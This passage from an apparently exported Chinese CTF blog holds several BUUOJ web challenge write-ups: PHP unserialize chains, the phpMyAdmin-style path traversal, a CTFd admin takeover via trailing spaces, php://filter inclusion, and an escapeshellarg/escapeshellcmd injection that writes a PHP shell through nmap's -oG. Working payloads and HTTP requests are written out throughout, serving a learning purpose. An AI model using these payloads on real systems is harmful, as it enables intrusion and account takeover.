class=\"line\"><span class=\"attribute\">Content-Type</span>: application/x-www-form-urlencoded</span><br><span class=\"line\"><span class=\"attribute\">Content-Length</span>: 603</span><br><span class=\"line\"></span><br><span class=\"line\">age=1&amp;nickname=&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;unionunionunionunionunionunion&quot;;s:8:&quot;CtrlCase&quot;;O:12:&quot;UpdateHelper&quot;:3:&#123;s:2:&quot;id&quot;;N;s:7:&quot;newinfo&quot;;N;s:3:&quot;sql&quot;;O:4:&quot;User&quot;:3:&#123;s:2:&quot;id&quot;;N;s:3:&quot;age&quot;;s:45:&quot;select password,id from user where username=?&quot;;s:8:&quot;nickname&quot;;O:4:&quot;Info&quot;:3:&#123;s:3:&quot;age&quot;;s:5:&quot;23333&quot;;s:8:&quot;nickname&quot;;s:8:&quot;Tiaonmmn&quot;;s:8:&quot;CtrlCase&quot;;O:6:&quot;dbCtrl&quot;:8:&#123;s:8:&quot;hostname&quot;;s:9:&quot;127.0.0.1&quot;;s:6:&quot;dbuser&quot;;s:4:&quot;root&quot;;s:6:&quot;dbpass&quot;;s:4:&quot;root&quot;;s:8:&quot;database&quot;;s:4:&quot;test&quot;;s:4:&quot;name&quot;;s:5:&quot;admin&quot;;s:8:&quot;password&quot;;N;s:6:&quot;mysqli&quot;;N;s:5:&quot;token&quot;;s:5:&quot;admin&quot;;&#125;&#125;&#125;&#125;&#125;</span><br></pre></td></tr></table></figure> 提交就会返回admin的MD5，注意最后面加上了一个“0-0”。 解密就可以登录，拿到flag了。</p>\r\n\n    <div id=\"aplayer-CHtdPdVE\" class=\"aplayer aplayer-tag-marker meting-tag-marker\"\n         data-id=\"22661168\" data-server=\"netease\" data-type=\"song\" data-mode=\"circulation\" data-autoplay=\"true\" data-mutex=\"true\" data-listmaxheight=\"340px\" data-preload=\"auto\" data-theme=\"#ad7a86\" data-loop=\"all\"\n    ></div>\r\n<p>flag{d73e9619-0858-4478-a940-b89dbb80d7ad}</p>\r\n","categories":["Writeups"],"tags":["Unserialize","PHP","Web"]},{"title":"BUUOJ刷题-Web-HCTF-WarmUp","url":"/2019/08/26/BUUOJ%E5%88%B7%E9%A2%98-Web-HCTF-WarmUp/","content":"<link rel=\"stylesheet\" class=\"aplayer-secondary-style-marker\" href=\"\\assets\\css\\APlayer.min.css\"><script src=\"\\assets\\js\\APlayer.min.js\" class=\"aplayer-secondary-script-marker\"></script><script class=\"meting-secondary-script-marker\" src=\"\\assets\\js\\Meting.min.js\"></script><p>HCTF2018-WarmUp。 <a id=\"more\"></a> <figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\">    highlight_file(<span class=\"keyword\">__FILE__</span>);</span><br><span class=\"line\">    <span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">emmm</span></span></span><br><span class=\"line\"><span class=\"class\">    </span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">public</span> <span class=\"built_in\">static</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">checkFile</span>(<span class=\"params\">&amp;$page</span>)</span></span><br><span class=\"line\"><span class=\"function\">        </span>&#123;</span><br><span class=\"line\">            $whitelist = [<span class=\"string\">&quot;source&quot;</span>=&gt;<span class=\"string\">&quot;source.php&quot;</span>,<span class=\"string\">&quot;hint&quot;</span>=&gt;<span class=\"string\">&quot;hint.php&quot;</span>];</span><br><span class=\"line\">            <span class=\"keyword\">if</span> (! <span class=\"keyword\">isset</span>($page) || !is_string($page)) &#123;</span><br><span class=\"line\">                <span class=\"keyword\">echo</span> <span class=\"string\">&quot;you can&#x27;t see it&quot;</span>;</span><br><span class=\"line\">                <span class=\"keyword\">return</span> <span class=\"literal\">false</span>;</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">            <span class=\"keyword\">if</span> (in_array($page, $whitelist)) &#123;</span><br><span class=\"line\">                <span class=\"keyword\">return</span> <span class=\"literal\">true</span>;</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">    </span><br><span class=\"line\">            $_page = mb_substr(</span><br><span class=\"line\">                $page,</span><br><span class=\"line\">                <span class=\"number\">0</span>,</span><br><span class=\"line\">                mb_strpos($page . <span class=\"string\">&#x27;?&#x27;</span>, <span class=\"string\">&#x27;?&#x27;</span>)</span><br><span class=\"line\">            );</span><br><span class=\"line\">            <span class=\"keyword\">if</span> (in_array($_page, $whitelist)) &#123;</span><br><span class=\"line\">                <span class=\"keyword\">return</span> <span class=\"literal\">true</span>;</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">    </span><br><span class=\"line\">            $_page = urldecode($page);</span><br><span class=\"line\">            $_page = mb_substr(</span><br><span class=\"line\">                $_page,</span><br><span class=\"line\">                <span class=\"number\">0</span>,</span><br><span class=\"line\">                mb_strpos($_page . <span class=\"string\">&#x27;?&#x27;</span>, <span class=\"string\">&#x27;?&#x27;</span>)</span><br><span class=\"line\">            );</span><br><span class=\"line\">            <span class=\"keyword\">if</span> (in_array($_page, $whitelist)) &#123;</span><br><span class=\"line\">                <span class=\"keyword\">return</span> <span class=\"literal\">true</span>;</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">            <span class=\"keyword\">echo</span> <span class=\"string\">&quot;you can&#x27;t see it&quot;</span>;</span><br><span class=\"line\">            <span class=\"keyword\">return</span> <span class=\"literal\">false</span>;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    </span><br><span class=\"line\">    <span class=\"keyword\">if</span> (! <span class=\"keyword\">empty</span>($_REQUEST[<span class=\"string\">&#x27;file&#x27;</span>])</span><br><span class=\"line\">        &amp;&amp; is_string($_REQUEST[<span class=\"string\">&#x27;file&#x27;</span>])</span><br><span class=\"line\">        &amp;&amp; emmm::checkFile($_REQUEST[<span class=\"string\">&#x27;file&#x27;</span>])</span><br><span class=\"line\">    ) &#123;</span><br><span class=\"line\">        <span class=\"keyword\">include</span> $_REQUEST[<span class=\"string\">&#x27;file&#x27;</span>];</span><br><span class=\"line\">        <span class=\"keyword\">exit</span>;</span><br><span class=\"line\">    &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">        <span class=\"keyword\">echo</span> <span class=\"string\">&quot;&lt;br&gt;&lt;img src=\\&quot;https://i.loli.net/2018/11/01/5bdb0d93dc794.jpg\\&quot; /&gt;&quot;</span>;</span><br><span class=\"line\">    &#125;  </span><br><span class=\"line\"><span class=\"meta\">?&gt;</span> </span><br><span class=\"line\"></span><br></pre></td></tr></table></figure></p>\r\n<p>hint.php提示flag在<code>ffffllllaaaagggg</code>文件下。如果file变量是string，并且通过emmm:checkfile()的检测就会include file所指文件。</p>\r\n<p>令我们感兴趣的是在checkfile()中反复出现的<code>$_page = mb_substr($_page,0,          mb_strpos($_page . '?', '?');</code>，这个涉及到phpMyAdmin的一个洞<a href=\"https://seaii-blog.com/index.php/2018/07/03/84.html\">CVE-2018-12613</a>，由于PHP会自动urldecode一次，导致我们提交%253f（?的urlencode的urlencode）的时候自动转成%3f，满足if条件，<code>%253f/</code>就会被认为是一个目录，从而include。</p>\r\n<p>所以我们提交<code>http://c970312d-58ed-4287-8cec-92b882939661.node1.buuoj.cn/source.php?file=hint.php%253f/../../../../../../../ffffllllaaaagggg</code>，即可得到flag。</p>\r\n\n    <div id=\"aplayer-RIxCHydr\" class=\"aplayer aplayer-tag-marker meting-tag-marker\"\n         data-id=\"28302585\" data-server=\"netease\" data-type=\"song\" data-mode=\"circulation\" data-autoplay=\"true\" data-mutex=\"true\" data-listmaxheight=\"340px\" data-preload=\"auto\" data-theme=\"#ad7a86\" data-loop=\"all\"\n    ></div>\r\n<p>flag{f0156132-3213-4d53-99a2-1a46c5fb6142}</p>\r\n","categories":["Writeups"],"tags":["PHP","Web","BUUOJ","mb_substr","mb_strpos"]},{"title":"BUUOJ刷题-Web-HappyCTFd","url":"/2020/03/01/BUUOJ%E5%88%B7%E9%A2%98-Web-HappyCTFd/","content":"<link rel=\"stylesheet\" class=\"aplayer-secondary-style-marker\" href=\"\\assets\\css\\APlayer.min.css\"><script src=\"\\assets\\js\\APlayer.min.js\" class=\"aplayer-secondary-script-marker\"></script><script class=\"meting-secondary-script-marker\" src=\"\\assets\\js\\Meting.min.js\"></script><p>BUUOJ上V&amp;N的招新题，涉及到CTFd的一个洞CVE-2020-7245。</p>\r\n<p>开题发现就是个CTFd的页面，随便注册后发现啥都没有，只有个admin用户，看来我们需要得到admin的权限。</p>\r\n<p>之前看CTFd的Release Notes时注意到在2.2.3版本有个<a href=\"https://github.com/CTFd/CTFd/releases/tag/2.2.3\">security fix</a>，修了个任意用户接管的洞。那就看一下2.2.3和2.2.2版本的<a href=\"https://github.com/CTFd/CTFd/compare/2.2.2...2.2.3\">diff</a>，到底改了什么。</p>\r\n<p>核心内容是auth.py，看一下register()函数 <figure class=\"highlight python\"><figcaption><span>2.2.2</span></figcaption><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">register</span>():</span></span><br><span class=\"line\">    errors = get_errors()</span><br><span class=\"line\">    <span class=\"keyword\">if</span> request.method == <span class=\"string\">&quot;POST&quot;</span>:</span><br><span class=\"line\">        name = request.form[<span class=\"string\">&quot;name&quot;</span>]</span><br><span class=\"line\">        email_address = request.form[<span class=\"string\">&quot;email&quot;</span>]</span><br><span class=\"line\">        password = request.form[<span class=\"string\">&quot;password&quot;</span>]</span><br><span class=\"line\"></span><br><span class=\"line\">        name_len = len(name) == <span class=\"number\">0</span></span><br><span class=\"line\">        names = Users.query.add_columns(<span class=\"string\">&quot;name&quot;</span>, <span class=\"string\">&quot;id&quot;</span>).filter_by(name=name).first()</span><br><span class=\"line\">        emails = (</span><br><span class=\"line\">            Users.query.add_columns(<span class=\"string\">&quot;email&quot;</span>, <span class=\"string\">&quot;id&quot;</span>)</span><br><span class=\"line\">            .filter_by(email=email_address)</span><br><span class=\"line\">            .first()</span><br><span class=\"line\">        )</span><br></pre></td></tr></table></figure></p>\r\n<p>2.2.2版本下验证是否已存在用户时通过request.form直接取值，但是在后面又来了段 <figure class=\"highlight python\"><figcaption><span>2.2.2</span></figcaption><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">else</span>:</span><br><span class=\"line\">    <span class=\"keyword\">with</span> app.app_context():</span><br><span class=\"line\">        user = Users(</span><br><span class=\"line\">            name=name.strip(),</span><br><span class=\"line\">            email=email_address.lower(),</span><br><span class=\"line\">            password=password.strip(),</span><br><span class=\"line\">        )</span><br><span class=\"line\">        db.session.add(user)</span><br><span class=\"line\">        db.session.commit()</span><br><span class=\"line\">        db.session.flush()</span><br></pre></td></tr></table></figure> 写入数据库的时候name经过了strip()，所以我们在注册的时候写<code>admin</code>就会造成实际写入库的用户名是<code>admin</code>。再回头看reset_password() <figure class=\"highlight python\"><figcaption><span>2.2.2</span></figcaption><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">if</span> request.method == <span class=\"string\">&quot;POST&quot;</span>:</span><br><span class=\"line\">    user = Users.query.filter_by(name=name).first_or_404()</span><br><span class=\"line\">    user.password = request.form[<span class=\"string\">&quot;password&quot;</span>].strip()</span><br><span class=\"line\">    db.session.commit()</span><br><span class=\"line\">    log(</span><br><span class=\"line\">        <span class=\"string\">&quot;logins&quot;</span>,</span><br><span class=\"line\">        format=<span class=\"string\">&quot;[&#123;date&#125;] &#123;ip&#125; -  successful password reset for &#123;name&#125;&quot;</span>,</span><br><span class=\"line\">        name=name,</span><br><span class=\"line\">    )</span><br><span class=\"line\">    db.session.close()</span><br><span class=\"line\">    <span class=\"keyword\">return</span> redirect(url_for(<span class=\"string\">&quot;auth.login&quot;</span>))</span><br></pre></td></tr></table></figure> 查询用户的时候直接使用库里的name字段，当我们注册admin （n个空格）的时候重置密码，实际上重置的是<code>admin</code>用户的密码。这样我们就可以任意登录admin用户了。</p>\r\n<p>总结一下，攻击流程如下：</p>\r\n<ol type=\"1\">\r\n<li>注册用户为admin （后面加上空格）</li>\r\n<li>重置密码</li>\r\n</ol>\r\n<p>在2.2.3版本下，register()函数会首先进行name的strip() <figure class=\"highlight python\"><figcaption><span>2.2.3</span></figcaption><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">register</span>():</span></span><br><span class=\"line\">    errors = get_errors()</span><br><span class=\"line\">    <span class=\"keyword\">if</span> request.method == <span class=\"string\">&quot;POST&quot;</span>:</span><br><span class=\"line\">        name = request.form.get(<span class=\"string\">&quot;name&quot;</span>, <span class=\"string\">&quot;&quot;</span>).strip()</span><br><span class=\"line\">        email_address = request.form.get(<span class=\"string\">&quot;email&quot;</span>, <span class=\"string\">&quot;&quot;</span>).strip().lower()</span><br><span class=\"line\">        password = request.form.get(<span class=\"string\">&quot;password&quot;</span>, <span class=\"string\">&quot;&quot;</span>).strip()</span><br><span class=\"line\"></span><br><span class=\"line\">        name_len = len(name) == <span class=\"number\">0</span></span><br><span class=\"line\">        names = Users.query.add_columns(<span class=\"string\">&quot;name&quot;</span>, <span class=\"string\">&quot;id&quot;</span>).filter_by(name=name).first()</span><br><span class=\"line\">        emails = (</span><br><span class=\"line\">            Users.query.add_columns(<span class=\"string\">&quot;email&quot;</span>, <span class=\"string\">&quot;id&quot;</span>)</span><br><span class=\"line\">            .filter_by(email=email_address)</span><br><span class=\"line\">            .first()</span><br><span class=\"line\">        )</span><br></pre></td></tr></table></figure> 我们没办法制造出重名的用户，就没办法利用了。 回到题目，BUUOJ里给了邮件服务器mail.buuoj.cn，注册的时候填给的邮箱就行。登录成admin后会发现有一道Hidden的题，下载附件就能看到flag了。</p>\r\n\n    <div id=\"aplayer-naBMQkOh\" class=\"aplayer aplayer-tag-marker meting-tag-marker\"\n         data-id=\"86279\" data-server=\"netease\" data-type=\"song\" data-mode=\"circulation\" data-autoplay=\"true\" data-mutex=\"true\" data-listmaxheight=\"340px\" data-preload=\"auto\" data-theme=\"#ad7a86\" data-loop=\"all\"\n    ></div>\r\n<p>flag{d993d0f0-b9b7-4cb3-9a58-e5f1b1304c1c}</p>\r\n","categories":["Writeups"],"tags":["Web","Python","CTFd","Flask"]},{"title":"BUUOJ刷题-Web-NiZhuanSiWei","url":"/2019/10/07/BUUOJ%E5%88%B7%E9%A2%98-Web-NiZhuanSiWei/","content":"<link rel=\"stylesheet\" class=\"aplayer-secondary-style-marker\" href=\"\\assets\\css\\APlayer.min.css\"><script src=\"\\assets\\js\\APlayer.min.js\" class=\"aplayer-secondary-script-marker\"></script><script class=\"meting-secondary-script-marker\" src=\"\\assets\\js\\Meting.min.js\"></script><p>有点老的题了。</p>\r\n<p>打开就给源码，然后扫目录发现有flag.php，访问没内容： <a id=\"more\"></a> <figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span>  </span><br><span class=\"line\">$text = $_GET[<span class=\"string\">&quot;text&quot;</span>];</span><br><span class=\"line\">$file = $_GET[<span class=\"string\">&quot;file&quot;</span>];</span><br><span class=\"line\">$password = $_GET[<span class=\"string\">&quot;password&quot;</span>];</span><br><span class=\"line\"><span class=\"keyword\">if</span>(<span class=\"keyword\">isset</span>($text)&amp;&amp;(file_get_contents($text,<span class=\"string\">&#x27;r&#x27;</span>)===<span class=\"string\">&quot;welcome to the zjctf&quot;</span>))&#123;</span><br><span class=\"line\">    <span class=\"keyword\">echo</span> <span class=\"string\">&quot;&lt;br&gt;&lt;h1&gt;&quot;</span>.file_get_contents($text,<span class=\"string\">&#x27;r&#x27;</span>).<span class=\"string\">&quot;&lt;/h1&gt;&lt;/br&gt;&quot;</span>;</span><br><span class=\"line\">    <span class=\"keyword\">if</span>(preg_match(<span class=\"string\">&quot;/flag/&quot;</span>,$file))&#123;</span><br><span class=\"line\">        <span class=\"keyword\">echo</span> <span class=\"string\">&quot;Not now!&quot;</span>;</span><br><span class=\"line\">        <span class=\"keyword\">exit</span>(); </span><br><span class=\"line\">    &#125;<span class=\"keyword\">else</span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">include</span>($file);  <span class=\"comment\">//useless.php</span></span><br><span class=\"line\">        $password = unserialize($password);</span><br><span class=\"line\">        <span class=\"keyword\">echo</span> $password;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"keyword\">else</span>&#123;</span><br><span class=\"line\">    highlight_file(<span class=\"keyword\">__FILE__</span>);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br></pre></td></tr></table></figure></p>\r\n<p>第一个if要求file_get_contents读<span class=\"math inline\">\\(text，内容为welcome to the zjctf，这个用php://input，然后POST传welcome to the zjctf就可以了。然后第二个if要求不能出现任何带有flag的字样的字符串，绕不过。然后include(\\)</span>file)，同时提示useless.php，那么我们用PHP伪协议读useless.php，php://filter/convert.base64-encode/resource=useless.php。得到useless.php如下：</p>\r\n<figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span>  </span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">Flag</span></span>&#123;  <span class=\"comment\">//flag.php  </span></span><br><span class=\"line\">    <span class=\"keyword\">public</span> $file;  </span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__tostring</span>(<span class=\"params\"></span>)</span>&#123;  </span><br><span class=\"line\">        <span class=\"keyword\">if</span>(<span class=\"keyword\">isset</span>(<span class=\"keyword\">$this</span>-&gt;file))&#123;  </span><br><span class=\"line\">            <span class=\"keyword\">echo</span> file_get_contents(<span class=\"keyword\">$this</span>-&gt;file); </span><br><span class=\"line\">            <span class=\"keyword\">echo</span> <span class=\"string\">&quot;&lt;br&gt;&quot;</span>;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> (<span class=\"string\">&quot;U R SO CLOSE !///COME ON PLZ&quot;</span>);</span><br><span class=\"line\">        &#125;  </span><br><span class=\"line\">    &#125;  </span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\r\n<p>很简单的Flag类，给<span class=\"math inline\">\\(file赋值，会file_get_contents(\\)</span>file)，直接打就可以了。 <figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">Flag</span></span></span><br><span class=\"line\"><span class=\"class\"></span>&#123;  <span class=\"comment\">//flag.php</span></span><br><span class=\"line\">    <span class=\"keyword\">public</span> $file=<span class=\"string\">&quot;php://filter/convert.base64-encode/resource=flag.php&quot;</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__tostring</span>(<span class=\"params\"></span>)</span></span><br><span class=\"line\"><span class=\"function\">    </span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (<span class=\"keyword\">isset</span>(<span class=\"keyword\">$this</span>-&gt;file)) &#123;</span><br><span class=\"line\">            <span class=\"keyword\">echo</span> file_get_contents(<span class=\"keyword\">$this</span>-&gt;file);</span><br><span class=\"line\">            <span class=\"keyword\">echo</span> <span class=\"string\">&quot;&lt;br&gt;&quot;</span>;</span><br><span class=\"line\">            <span class=\"keyword\">return</span> (<span class=\"string\">&quot;U R SO CLOSE !///COME ON PLZ&quot;</span>);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">$a=<span class=\"keyword\">new</span> Flag();</span><br><span class=\"line\"><span class=\"keyword\">print</span>(serialize($a));</span><br></pre></td></tr></table></figure></p>\r\n<p>所以，最终的Payload为：</p>\r\n<figure class=\"highlight http\"><table><tr><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">POST</span> <span class=\"string\">/?text=php://input&amp;file=useless.php&amp;password=O:4:&quot;Flag&quot;:1:&#123;s:4:&quot;file&quot;;s:52:&quot;php://filter/convert.base64-encode/resource=flag.php&quot;;&#125;</span> HTTP/1.1</span><br><span class=\"line\"><span class=\"attribute\">Host</span>: 41171917-0950-4ee1-b7d0-f4ba9e0e7242.node2.buuoj.cn.wetolink.com:82</span><br><span class=\"line\"><span class=\"attribute\">Pragma</span>: no-cache</span><br><span class=\"line\"><span class=\"attribute\">Cache-Control</span>: no-cache</span><br><span class=\"line\"><span class=\"attribute\">Upgrade-Insecure-Requests</span>: 1</span><br><span class=\"line\"><span class=\"attribute\">User-Agent</span>: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.90 Safari/537.36</span><br><span class=\"line\"><span class=\"attribute\">Accept</span>: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3</span><br><span class=\"line\"><span class=\"attribute\">Accept-Encoding</span>: gzip, deflate</span><br><span class=\"line\"><span class=\"attribute\">Accept-Language</span>: en-US,en;q=0.9,zh-CN;q=0.8,zh;q=0.7</span><br><span class=\"line\"><span class=\"attribute\">Connection</span>: close</span><br><span class=\"line\"><span class=\"attribute\">Content-Length</span>: 20</span><br><span class=\"line\"></span><br><span class=\"line\">welcome to the zjctf</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\r\n\n    <div id=\"aplayer-mfHtKXpN\" class=\"aplayer aplayer-tag-marker meting-tag-marker\"\n         data-id=\"862100515\" data-server=\"netease\" data-type=\"song\" data-mode=\"circulation\" data-autoplay=\"true\" data-mutex=\"true\" data-listmaxheight=\"340px\" data-preload=\"auto\" data-theme=\"#ad7a86\" data-loop=\"all\"\n    ></div>\r\n<p>flag{02e8a6f0-ddaa-4414-a807-aa01eeae999b}</p>\r\n","categories":["Writeups"],"tags":["PHP","Web","BUUOJ"]},{"title":"BUUOJ刷题-Web-Online-Tool","url":"/2019/09/08/BUUOJ%E5%88%B7%E9%A2%98-Web-Online-Tool/","content":"<link rel=\"stylesheet\" class=\"aplayer-secondary-style-marker\" href=\"\\assets\\css\\APlayer.min.css\"><script src=\"\\assets\\js\\APlayer.min.js\" class=\"aplayer-secondary-script-marker\"></script><script class=\"meting-secondary-script-marker\" src=\"\\assets\\js\\Meting.min.js\"></script><p>BUUCTF 2018的Online Tool。给了源码： <a id=\"more\"></a> <figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">if</span> (<span class=\"keyword\">isset</span>($_SERVER[<span class=\"string\">&#x27;HTTP_X_FORWARDED_FOR&#x27;</span>])) &#123;</span><br><span class=\"line\">    $_SERVER[<span class=\"string\">&#x27;REMOTE_ADDR&#x27;</span>] = $_SERVER[<span class=\"string\">&#x27;HTTP_X_FORWARDED_FOR&#x27;</span>];</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">if</span>(!<span class=\"keyword\">isset</span>($_GET[<span class=\"string\">&#x27;host&#x27;</span>])) &#123;</span><br><span class=\"line\">    highlight_file(<span class=\"keyword\">__FILE__</span>);</span><br><span class=\"line\">&#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">    $host = $_GET[<span class=\"string\">&#x27;host&#x27;</span>];</span><br><span class=\"line\">    $host = escapeshellarg($host);</span><br><span class=\"line\">    $host = escapeshellcmd($host);</span><br><span class=\"line\">    $sandbox = md5(<span class=\"string\">&quot;glzjin&quot;</span>. $_SERVER[<span class=\"string\">&#x27;REMOTE_ADDR&#x27;</span>]);</span><br><span class=\"line\">    <span class=\"keyword\">echo</span> <span class=\"string\">&#x27;you are in sandbox &#x27;</span>.$sandbox;</span><br><span class=\"line\">    @mkdir($sandbox);</span><br><span class=\"line\">    chdir($sandbox);</span><br><span class=\"line\">    <span class=\"keyword\">echo</span> system(<span class=\"string\">&quot;nmap -T5 -sT -Pn --host-timeout 2 -F &quot;</span>.$host);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure> 看到system就想到命令注入了，下面仔细看一下传入的参数。$host经GET传入，然后过escapeshellarg和escapeshellcmd处理，最后传入nmap。<a href=\"https://www.php.net/manual/zh/function.escapeshellarg.php\">escapeshellarg</a>和<a href=\"https://www.php.net/manual/zh/function.escapeshellcmd.php\">escapeshellcmd</a>用来转义命令行和参数。他们俩单独使用没什么问题，但是如果同时使用就产生<a href=\"https://paper.seebug.org/164/\">问题</a>了。就本题而言，简单来说我们传入的数据（以<code>' &lt;?php phpinfo();?&gt; -oG test/mmm.txt</code>为例）会变成这样：</p>\r\n<ol type=\"1\">\r\n<li><p>先进行escapeshellarg编码，会将<code>'</code>转义，变成：<code>''\\'' &lt;?php phpinfo();?&gt; -oG test/mmm.txt'</code>。我们输入的单引号使用<code>\\</code>转义，此时单引号被当成普通字符处理，需要被<code>''</code>包裹，而返回结果的第一个与最后一个单引号字符是escapeshellarg添加的。</p></li>\r\n<li><p>进行escapeshellcmd编码，返回<code>''\\\\'' \\&lt;\\?php phpinfo\\(\\)\\;\\?\\&gt; -oG test/mmm.txt\\'</code>。escapeshellcmd会在*&#;`|\\*?~<>^()[]{}$\\*, *\\x0A* 和 *\\xFF*字符前加一个<code>\\</code>，因此第一部中插入的<code>\\</code>自身被转义，原本被转移的单引号开始有意义，而<code>''\\\\''</code>这组单引号已经配对，第一步escapeshellarg造成的限制已经解除。后买你的内容我们完全可控。而最后的单引号则会因为单引号不配对被转义，对我们的命令不造成任何影响。</p></li>\r\n</ol>\r\n<p>那么我们就逃逸出来了。但是现在的问题是我们没法打断原本的nmap命令行，常见的<code>|</code>，<code>;</code>都会被escapeshellcmd转义掉。那我们只能想办法通过nmap命令参数进行些事情了。</p>\r\n<p>nmap的输出选项中有一个很有意思：<a href=\"https://nmap.org/book/output-formats-grepable-output.html\">-oG</a>，这个格式会将nmap的输出完整输出到一个文件中，不转义。如果使用默认的-oN，会转义。那么</p>\r\n<p>好了，我们的Payload很明确了，写一个Shell到文件中。<code>' &lt;?php phpinfo();?&gt; -oG test.php'</code>。然后访问相关目录的test.php就会得到phpinfo信息了。然后写个shell，或者读文件什么的随你了。</p>\r\n\n    <div id=\"aplayer-jQJAhSGL\" class=\"aplayer aplayer-tag-marker meting-tag-marker\"\n         data-id=\"4278298\" data-server=\"netease\" data-type=\"song\" data-mode=\"circulation\" data-autoplay=\"true\" data-mutex=\"true\" data-listmaxheight=\"340px\" data-preload=\"auto\" data-theme=\"#ad7a86\" data-loop=\"all\"\n    ></div>\r\n<p>flag{1c23e720-d581-403a-8fc1-70a0f633c485}</p>\r\n","categories":["Writeups"],"tags":["PHP","Web","BUUOJ","escapeshellarg","escapeshellcmd","命令注入"]},{"title":"BUUOJ刷题-Web-Pickle-Store","url":"/2020/02/28/BUUOJ%E5%88%B7%E9%A2%98-Web-Pickle-Store/","content":"<link rel=\"stylesheet\" class=\"aplayer-secondary-style-marker\" href=\"\\assets\\css\\APlayer.min.css\"><script src=\"\\assets\\js\\APlayer.min.js\" class=\"aplayer-secondary-script-marker\"></script><script class=\"meting-secondary-script-marker\" src=\"\\assets\\js\\Meting.min.js\"></script><p>watevCTF 2019的Pickle Store。（注，pickle有酸黄瓜的意思） 开题后是个购买网站，Burp抓一下包，在Cookie中有些东西。</p>\r\n<img src=\"/2020/02/28/BUUOJ%E5%88%B7%E9%A2%98-Web-Pickle-Store/Cookies-1.png\" class=\"\" title=\"Cookies-1\">\r\n<a id=\"more\"></a>\r\n<p>Coookies里给了串像是Base64的东西，解出来发现是一些乱码<code>b'\\x80\\x03&#125;q\\x00(X\\x05\\x00\\x00\\x00moneyq\\x01M\\xf4\\x01X\\x07\\x00\\x00\\x00historyq\\x02]q\\x03X\\x10\\x00\\x00\\x00anti_tamper_hmacq\\x04X \\x00\\x00\\x00aa1ba4de55048cf20e0a7a63b7f8eb62q\\x05u.'</code>。有明文字符串，那么会是什么东西？抬头看看标题，Pickle Store，会不会是Python pickle数据？pickle.loads解一下果然出东西了<code>&#123;'money': 500, 'history': [], 'anti_tamper_hmac': 'aa1ba4de55048cf20e0a7a63b7f8eb62'&#125;</code>。 很明显，我们把money改了就可以任意购买东西，但是最后那个扎眼的anti_tamper_hmac是什么鬼。强行修改money后pickle.dumps，再Base64回去，换掉Cookies，果然money没变化。 下面研究一下HMAC，不过在研究HMAC之前，我们要想到一个问题，他竟然敢用Pickle？Pickle很容易RCE的，例如<a href=\"https://www.jianshu.com/p/8fd3de5b4843\">这里</a>。照着写个class好了 <figure class=\"highlight python\"><table><tr><td 